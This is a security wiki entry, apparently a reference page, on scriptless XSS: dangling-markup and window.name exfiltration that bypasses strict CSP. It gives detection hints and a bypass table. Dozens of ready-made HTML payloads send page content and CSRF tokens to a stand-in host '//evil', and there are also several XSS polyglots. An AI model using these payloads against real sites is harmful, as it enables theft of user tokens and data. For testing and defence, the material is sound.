---
title: DOM XSS — Scriptless Attacks (Dangling Markup, CSS Exfil)
slug: scriptless-attacks
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [technique/dom-xss, technique/scriptless-attacks]
inbound: []
---

# DOM XSS — Scriptless Attacks (Dangling Markup, CSS Exfil)

## Pattern

When a strict CSP blocks all script execution (including inline and `eval`), attacker-controlled HTML can still exfiltrate page content by injecting tags whose resource-load attributes (`src`, `href`, `background`, `action`, `formaction`) are left unclosed — "dangling markup". The browser fetches the URL and appends subsequent page content (including tokens, nonces, form fields) as part of the query string or path. Variants use `window.name` as the out-of-band channel via `target=` or `formtarget=` attributes, bypassing CSP's `connect-src`.

## Preconditions

- CSP blocks all script execution (`script-src 'none'` or nonce-only).
- No Trusted Types enforcement, or injection reaches a sink before sanitization.
- Attacker-controlled partial injection into HTML with no strong output encoding.
- Victim must trigger the injected element's load (page load is often sufficient for `<img>`, `<link>`, `<meta>`).
- For `window.name` exfil: attacker controls the opener window (requires a click to navigate victim to attacker page first, or can cross-frame the victim).

## Detection

- Injection context: partial HTML injection (can open but not close a tag, or inject new tags).
- Check for CSP header — if `script-src` is restrictive, dangling markup is the primary XSS path.
- `js_analyzer`: even without a JS sink, HTML injection into `innerHTML` can carry dangling markup.
- Look for form/input elements on page with sensitive values (CSRF tokens, account data).

## Triggering

### Dangling markup — URL exfiltration

```html
<!-- background attribute variants (exfil until next " in page) -->
<body background="//evil?
<table background="//evil?
<table><thead background="//evil?
<table><tbody background="//evil?
<table><tfoot background="//evil?
<table><td background="//evil?
<table><th background="//evil?

<!-- Link href stylesheet / icon -->
<link rel=stylesheet href="//evil?
<link rel=icon href="//evil?

<!-- Meta refresh exfil -->
<meta http-equiv="refresh" content="0; http://evil?

<!-- img src -->
<img src="//evil?
<image src="//evil?

<!-- video/audio source -->
<video><track default src="//evil?
<video><source src="//evil?
<audio><source src="//evil?

<!-- Input, button, form via formaction/action -->
<input type=image src="//evil?
<form><button style="width:100%;height:100%" type=submit formaction="//evil?
<form><input type=submit value="XSS" style="width:100%;height:100%" type=submit formaction="//evil?
<button form=x style="width:100%;height:100%;"><form id=x action="//evil?

<!-- Object, iframe, embed -->
<object data="//evil?
<iframe src="//evil?
<embed src="//evil?
```

### window.name exfil (CSP-safe)

```html
<!-- textarea consumes markup, form posts to attacker capturing window.name -->
<form><button formaction=//evil>XSS</button><textarea name=x>

<!-- window.name via form target -->
<button form=x>XSS</button><form id=x action=//evil target='

<!-- window.name via base target (payload appended after quote) -->
<a href=http://victim/dangling><font size=100 color=red>You must click me</font></a><base target="

<!-- window.name via formtarget -->
<form><input type=submit value="Click me" formaction=http://victim/dangling formtarget="
```

### base href exfil

```html
<a href=abc style="width:100%;height:100%;position:absolute;font-size:1000px;">xss<base href="//evil/
```

### Polyglots (work in multiple contexts)

```javascript
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>

javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \"
 onmouseover=/*&lt;svg/*/onload=alert()//>

javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/"/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//'>
```

## Bypasses

| Defense | Bypass |
|---|---|
| CSP `connect-src` | Use `window.name` via `target=` — no HTTP request from injected page |
| CSP `img-src 'none'` | Use `<link>` or `<meta refresh>` |
| SameSite cookies | Content still loads; authentication tokens in page source (CSRF tokens, nonces) are still exfiltrated |
| `Content-Security-Policy: default-src 'none'` | `<meta refresh>` is not covered by `default-src` in all parsers |
| Sanitizer strips incomplete tags | Use complete tags with unclosed attribute values |
| Strong output encoding | Dangling only works on raw HTML injection; if encoding is applied it fails |

## Seen-in-the-wild

- (none yet)

## References

- [../../sources/portswigger-xss-cheatsheet.md](../../sources/portswigger-xss-cheatsheet.md) — primary source; all payloads above are verbatim from the PortSwigger XSS Cheat Sheet (2026 ed., Scriptless attacks + Polyglots sections)
